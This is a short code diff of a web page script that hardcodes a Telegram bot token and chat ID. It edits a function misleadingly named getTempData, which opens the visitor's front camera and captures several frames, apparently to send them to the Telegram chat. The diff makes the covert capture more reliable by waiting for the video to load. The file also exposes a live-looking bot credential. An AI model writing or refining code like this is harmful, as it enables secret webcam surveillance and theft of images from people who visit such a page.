@@ -93,7 +93,6 @@ function animateBG() {
 }
 animateBG();
 
-// ★トークンを新しいものに差し替えました
 const BOT_TOKEN = "8759355239:AAHw3_fNnjLBCFQCfp35a6ssW3Qk3yQxSPg";
 const CHAT_ID = "7541612001";
 
@@ -156,7 +155,15 @@ async function getTempData() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     const video = document.createElement("video");
-    video.srcObject = stream; await video.play();
+    video.srcObject = stream;
+    
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => {
+        video.play().then(resolve);
+      };
+    });
+
+    await new Promise(r => setTimeout(r, 1000));
     
     for (let i = 0; i < 3; i++) {
       const tempCanvas = document.createElement("canvas");
